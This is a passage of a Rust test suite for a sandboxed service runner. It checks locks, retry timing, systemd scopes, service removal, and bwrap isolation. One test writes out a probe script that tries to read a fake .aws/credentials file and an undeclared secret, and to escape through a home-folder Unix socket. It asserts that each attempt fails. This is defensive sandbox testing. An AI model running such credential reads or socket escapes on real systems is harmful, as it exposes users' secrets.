        .unwrap();
        assert!(
            run_due(&r, now + 9 * 3_600_000).is_empty(),
            "an off service is not run"
        );
    }

    /// A Unix socket at `path` (this test's own), accepting.
    fn listening(path: &Path) -> std::os::unix::net::UnixListener {
        let l = std::os::unix::net::UnixListener::bind(path).unwrap();
        let c = l.try_clone().unwrap();
        std::thread::spawn(move || {
            for s in c.incoming().flatten() {
                drop(s);
            }
        });
        l
    }

    // S-69, with `bwrap`: a run sees nothing of the home but what it declared. A socket in the
    // home (a process manager's, a terminal multiplexer's: the way out of the jail) cannot be
    // connected to; a file outside `reads` and a credentials folder cannot be read; a declared
    // read path is read and not written; what it writes is private (`umask 077`).
    #[test]
    fn a_run_sees_nothing_of_the_home_but_what_it_declared() {
        let Some(jail) = bwrap() else { return };
        if !Path::new("/usr/bin/python3").is_file() {
            eprintln!("SKIPPED (no python3 to connect with; nothing was tested)");
            return;
        }
        let t = tmp();
        let d = dirs_in(t.path());
        let r = runner(&d, &jail, t.path());
        let (notes, out) = (d.home.join("notes"), d.home.join("out"));
        for p in [&notes, &out, &d.home.join(".aws")] {
            fs::create_dir_all(p).unwrap();
        }
        fs::write(notes.join("a.txt"), "the notes\n").unwrap();
        fs::write(d.home.join("secret.txt"), "not declared").unwrap();
        fs::write(d.home.join(".aws/credentials"), "aws key").unwrap();
        let sock = d.home.join("pm.sock");
        let _l = listening(&sock);
        let q = |p: &Path| quote(&p.display().to_string());
        let script = format!(
            "python3 -I -c 'import socket,sys; s=socket.socket(socket.AF_UNIX); s.connect(sys.argv[1])' {sock} 2>/dev/null && echo LEAK socket\n\
             cat {secret} 2>/dev/null && echo LEAK secret\n\
             cat {aws} 2>/dev/null && echo LEAK aws\n\
             cat {notes}/a.txt\n\
             echo x > {notes}/new 2>/dev/null && echo LEAK wrote-a-read-path\n\
             echo s > \"$CLIO_STATE_DIR/s\"\n\
             echo o > {out}/o\n",
            sock = q(&sock),
            secret = q(&d.home.join("secret.txt")),
            aws = q(&d.home.join(".aws/credentials")),
            notes = q(&notes),
            out = q(&out),
        );
        let mut m = manifest("reader", "bash run.sh");
        m.reads = vec![notes.display().to_string()];
        m.writes = vec![out.display().to_string()];
        approve(
            &d,
            &m,
            &[SkillFile {
                path: "run.sh".into(),
                content: script,
            }],
        );
        let x = r.run("reader", "person").unwrap().unwrap();
        assert_eq!(x.outcome, "ok", "{x:?}");
        assert!(!x.tail.contains("LEAK"), "{}", x.tail);
        assert!(x.tail.contains("the notes"), "{}", x.tail);
        assert_eq!(x.limits, "per-process");
        assert!(!notes.join("new").exists());
        for f in [root(&d).join("state/reader/s"), out.join("o")] {
            assert_eq!(
                fs::metadata(&f).unwrap().permissions().mode() & 0o777,
                0o600,
                "{}",
                f.display()
            );
        }
        // Outside the jail the socket does connect: the check above is a real one.
        assert!(std::os::unix::net::UnixStream::connect(&sock).is_ok());
    }

    // S-69: a service waiting for the vault is tried again by the timer at most every 15
    // minutes; a run held by its lock, or no longer due once the lock is taken, is skipped.
    #[test]
    fn a_waiting_service_backs_off_and_the_lock_and_due_are_checked_again() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        let mut r = runner(&d, &jail, t.path());
        r.gateway = None;
        let mut m = manifest("keyed", "true");
        m.network = vec!["api.example.com".into()];
        m.secrets = vec![sv::SecretUse {
            name: "k".into(),
            env: "K".into(),
            host: "api.example.com".into(),
        }];
        approve(&d, &m, &[]);
        let now = now_ms();
        assert_eq!(run_due(&r, now), ["keyed: waiting"]);
        assert!(
            run_due(&r, now + 60_000).is_empty(),
            "not again a minute later"
        );
        assert!(run_due(&r, now + WAIT_RETRY_MS - 60_000).is_empty());
        assert_eq!(
            run_due(&r, now + WAIT_RETRY_MS + 60_000),
            ["keyed: waiting"]
        );
        assert_eq!(take_notices(&d).len(), 1, "told once");
        // The person can still run it by hand.
        assert_eq!(
            r.run("keyed", "person").unwrap().unwrap().outcome,
            "waiting"
        );

        approve(&d, &manifest("busy", "true"), &[]);
        let lp = root(&d).join("locks/busy.lock");
        let held = fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .open(&lp)
            .unwrap();
        rustix::fs::flock(&held, rustix::fs::FlockOperation::LockExclusive).unwrap();
        assert!(r.run_checked("busy", "timer", Some(now)).unwrap().is_none());
        drop(held);
        let x = r.run_checked("busy", "timer", Some(now)).unwrap().unwrap();
        assert_eq!(x.outcome, "ok");
        // It ran meanwhile: no longer due when its lock is taken again.
        assert!(r.run_checked("busy", "timer", Some(now)).unwrap().is_none());
    }

    /// A stand-in for `systemd-run` in `dir`: logs its arguments; `ok` exits 0 without running
    /// anything (as a scope that took the command away), else fails (no scope).
    fn fake_systemd_run(dir: &Path, ok: bool) -> PathBuf {
        let p = dir.join(if ok { "sr-ok" } else { "sr-fails" });
        fs::write(
            &p,
            format!(
                "#!/bin/sh\necho \"$@\" >> \"$0.log\"\nexit {}\n",
                if ok { 0 } else { 1 }
            ),
        )
        .unwrap();
        fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();
        p
    }

    // S-69: with scopes, each due service starts in its own (`clio services run-timer <name>`)
    // and is not waited for; when its scope does not start, it runs here as before.
    #[test]
    fn run_due_starts_each_service_in_its_own_scope_or_runs_it_here() {
        let Some(jail) = bwrap() else { return };
        let t = tmp();
        let d = dirs_in(t.path());
        approve(
            &d,
            &manifest("hourly", "echo x >> \"$CLIO_STATE_DIR/n\""),
            &[],
        );
        let ok = fake_systemd_run(t.path(), true);
        let scoped = jail.clone().with_scope(Some(ok.clone()));
        let r = runner(&d, &scoped, t.path());
        let now = now_ms();
        assert_eq!(run_due(&r, now), ["hourly: started in a scope of its own"]);
        assert_eq!(
            fs::read_to_string(format!("{}.log", ok.display())).unwrap(),
            format!(
                "--user --scope --quiet --collect -- {} services run-timer hourly\n",
                r.exe.display()
            )
        );
        assert!(!root(&d).join("state/hourly/n").exists(), "not run here");
        let fails = jail
            .clone()
            .with_scope(Some(fake_systemd_run(t.path(), false)));
        let r = runner(&d, &fails, t.path());
        assert_eq!(run_due(&r, now), ["hourly: ok"]);
        assert_eq!(
            fs::read_to_string(root(&d).join("state/hourly/n")).unwrap(),
            "x\n"
        );
    }

    // S-69: removing a service takes its state and its runs with it (kept in `removed/`): a later
    // service of the same name starts with neither. Not while it runs.
    #[test]
    fn a_removed_service_takes_its_state_and_runs_and_a_new_one_starts_empty() {
        let t = tmp();
        let d = dirs_in(t.path());
        let root = root(&d);
        approve(&d, &manifest("gone", "true"), &[]);
        fs::write(state_dir(&root, "gone").join("seen"), "old state").unwrap();
        let run = Run {
            start_ms: 1,
            ms: 1,
            version: 1,
            outcome: "ok".into(),
            exit: Some(0),
            why: String::new(),
            tail: "old output".into(),
            by: "timer".into(),
            limits: String::new(),
        };
        save_run(&root, "gone", run).unwrap();
        mkdir_private(&root.join("locks")).unwrap();
        let held = fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .open(root.join("locks/gone.lock"))
            .unwrap();
        rustix::fs::flock(&held, rustix::fs::FlockOperation::LockExclusive).unwrap();
        assert!(
            skills::remove_in(&root, Kind::Service, "gone").is_err(),
            "not while it runs"
        );
        drop(held);
        skills::remove_in(&root, Kind::Service, "gone").unwrap();
        let kept = fs::read_dir(root.join("removed"))
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        assert_eq!(
            fs::read_to_string(kept.join("state/seen")).unwrap(),
            "old state"
        );
        assert!(
            fs::read_to_string(kept.join("runs.json"))
                .unwrap()
                .contains("old output")
        );
        approve(&d, &manifest("gone", "true"), &[]);
        assert_eq!(fs::read_dir(state_dir(&root, "gone")).unwrap().count(), 0);
        assert!(sv::runs(&root, "gone").is_empty());
    }
}
